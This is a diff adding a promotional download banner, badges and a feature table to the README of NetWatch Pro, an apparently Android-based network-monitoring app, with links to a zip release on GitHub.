@@ -65,7 +65,44 @@ The entire application is designed to run as a modern Android application throug
 NetWatch Pro uses a futuristic dark interface designed for a clean, focused, and professional monitoring experience.
 
 ---
+<div align="center">🚀 NETWATCH PRO
 
+⚡ Advanced Local-First Network Monitoring for Android
+
+<br><table>
+<tr>
+<td align="center">📦 LATEST ANDROID BUILD
+
+Take control of your monitoring workflow.
+
+<br><a href="https://github.com/danyalasadpoor/cyber-net-probe/releases/download/Netwatch-pro/Netwatch-pro.zip">
+<img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-00D4FF?style=for-the-badge&logo=android&logoColor=white" alt="Download NetWatch Pro">
+</a><br><br>
+
+<img src="https://img.shields.io/badge/RELEASE-v0.1.0-7C3AED?style=flat-square">
+<img src="https://img.shields.io/badge/PLATFORM-ANDROID-3DDC84?style=flat-square&logo=android&logoColor=white">
+<img src="https://img.shields.io/badge/STATUS-PRE--RELEASE-FFB000?style=flat-square"><br><br>
+
+⬇️ Download the latest NetWatch Pro Android build
+
+<br><a href="https://github.com/danyalasadpoor/cyber-net-probe/releases/download/Netwatch-pro/Netwatch-pro.zip">
+<strong>👉 GET NETWATCH PRO</strong>
+</a></td>
+</tr>
+</table><br>«🛡️ Local-first. Private. Powerful.
+
+Your monitoring data stays on your device.»
+
+<br>✨ WHAT'S INSIDE
+
+🔍 Scanner| 📊 Analytics| 🗃️ Local Database
+Configurable scanning| Real-time statistics| SQLite-powered storage
+
+🎯 Target Management| 📥 Import & Export| 📱 Android Ready
+Organize your targets| Backup & restore| Built with Capacitor
+
+</div>
+---
 # 🚀 Features
 
 ## 🔍 Advanced Scanner
